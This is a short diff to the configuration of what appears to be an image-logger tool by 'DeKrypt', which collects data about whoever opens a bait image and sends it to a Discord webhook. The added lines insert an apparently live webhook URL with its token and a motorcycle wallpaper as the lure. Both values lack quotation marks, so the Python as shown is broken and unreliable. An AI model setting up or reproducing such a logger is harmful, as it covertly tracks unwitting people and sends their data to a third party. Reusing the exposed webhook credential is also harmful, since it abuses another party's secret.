@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discordapp.com/api/webhooks/1344969668976447538/YBFc_89u0gwLi28gaflzdVHhpidHNSnqogu59r7d_D-YZez7uzAXvkLIxxfZrP3UfRQo
+    "image": https://compare.pricesofindia.com/src/wallpapers/yamaha/yamaha-yzf-r6/Yamaha-YZF-R6-HD-Wallpapers-PricesOfIndia-2.jpg
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
